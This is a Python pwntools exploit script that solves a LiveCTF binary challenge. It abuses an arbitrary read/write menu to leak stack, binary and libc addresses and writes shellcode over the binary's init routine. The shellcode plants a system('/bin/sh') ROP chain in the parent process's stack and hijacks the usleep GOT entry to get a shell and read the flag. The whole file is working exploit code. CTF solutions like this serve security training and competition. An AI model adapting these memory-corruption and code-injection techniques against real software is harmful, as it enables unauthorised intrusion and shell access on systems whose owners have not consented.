#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
context.binary = e = ELF("/challenge")
libc = ELF("/libc.so.6")


def read_(addr):
    p.sendlineafter(b"Choice: ", b"1")
    p.sendlineafter(b"Address: ", hex(addr).encode())


def write_(addr, value):
    p.sendlineafter(b"Choice: ", b"2")
    p.sendlineafter(b"Value: ", hex(value).encode())
    p.sendlineafter(b"Address: ", hex(addr).encode())


p = io

read_(0x28)
p.recvuntil(b"Value: ")
toleak = int(p.recvline().decode(), 16) - 0x130 + 0x10
read_(toleak)
p.recvuntil(b"Value: ")
e.address = int(p.recvline().decode(), 16) - (e.sym.child + 27)

read_(e.got.kill)
p.recvuntil(b"Value: ")

libc.address = int(p.recvline().decode(), 16) - libc.sym.kill

# log.success(hex(toleak))
# log.success(hex(libc.address))

to_write = e.sym.init

shellcode = asm(f"""
nop
nop
nop
nop

mov eax,0x6e
syscall
mov edi, eax
mov rsi, {toleak+0x10}
mov rdx, {libc.address+0x000000000002a3e5}
mov rcx, {e.sym.writev_helper}
call rcx

mov eax,0x6e
syscall
mov edi, eax
mov rsi, {toleak+0x18}
mov rdx, {next(libc.search(b"/bin/sh"))}
mov rcx, {e.sym.writev_helper}
call rcx

mov eax,0x6e
syscall
mov edi, eax
mov rsi, {toleak+0x20}
mov rdx, {libc.address+0x000000000002a3e6}
mov rcx, {e.sym.writev_helper}
call rcx

mov eax,0x6e
syscall
mov edi, eax
mov rsi, {toleak+0x28}
mov rdx, {libc.sym.system}
mov rcx, {e.sym.writev_helper}
call rcx
""")


def split_byte_string(byte_string, chunk_size=8):
    return [byte_string[i:i+chunk_size] for i in range(0, len(byte_string), chunk_size)]


_ = split_byte_string(shellcode)

for i in range(len(_)):
    write_(to_write+8*i, u64(_[i].ljust(8, b'\x90')))

write_(e.got.usleep, e.sym.init)

r = p
r.sendlineafter(b"Choice: ", b'3')
r.sendline(b'./submitter')
flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
